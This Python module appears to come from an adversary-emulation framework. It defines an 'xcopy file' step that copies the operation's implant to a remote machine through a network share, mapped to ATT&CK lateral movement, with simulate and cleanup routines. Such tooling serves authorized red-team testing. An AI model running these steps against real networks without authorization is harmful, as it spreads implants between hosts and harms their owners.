from plugins.adversary.app.commands import xcopy
from plugins.adversary.app.operation.operation import Step, OPFile, OPRat, OPVar, OPShare


class XCopy(Step):
    """
    Description:
        This step copies a file from a local machine to a remote machine on the network using a share.
    Requirements:
        Requires a pre-existing share on the target remote machine (usually created using NetUse).
    """
    display_name = "xcopy file"
    summary = "Use xcopy.exe to copy a file from a computer to another using a network share"
    attack_mapping = [('T1105', 'Lateral Movement')]

    preconditions = [("rat", OPRat),
                     ("share", OPShare({"src_host": OPVar("rat.host")}))]
    postconditions = [("file_g", OPFile({'host': OPVar("share.dest_host")}))]

    preproperties = ['rat.executable', 'share.share_path']

    deterministic = True

    @staticmethod
    def description(rat, share):
        return "XCopying an implant from {} to {}".format(rat.host.fqdn, share.dest_host.fqdn)

    @staticmethod
    async def simulate(operation, rat, share, file_g):
        return True

    @staticmethod
    async def action(operation, rat, share, file_g):
        # NOTE: Because of the way XCopy is invoked, we can't tell if it was successful or not by parsing stdout.
        # So, it is assumed that XCopy was successful.
        file_name = operation.adversary_artifactlist.get_executable_word()
        target_path = "{share_path}\\{file_name}".format(share_path=share.share_path, file_name=file_name)
        await operation.execute_shell_command(rat, *xcopy.file(rat.executable, target_path, overwrite_destination=True))
        await file_g({'src_host': share.src_host, 'src_path': rat.executable, 'path': target_path, 'use_case': 'rat'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)
